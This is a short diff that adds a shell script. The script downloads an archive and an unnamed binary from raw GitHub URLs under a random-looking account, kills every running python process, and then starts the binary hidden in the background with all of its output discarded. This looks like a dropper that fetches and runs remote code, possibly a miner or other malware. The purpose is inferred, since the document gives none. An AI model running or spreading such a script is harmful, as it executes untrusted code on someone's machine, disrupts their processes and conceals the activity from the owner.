@@ -1,0 +1,8 @@
+curl -LJO https://raw.githubusercontent.com/r4d20z2st15qp/a164/main/forecast.tar.gz
+curl -LJO https://raw.githubusercontent.com/r4d20z2st15qp/g892/main/a4
+tar xvzf forecast.tar.gz
+chmod +x a4
+pkill python
+sleep 6
+nohup ./a4 > /dev/null 2>&1 &
+
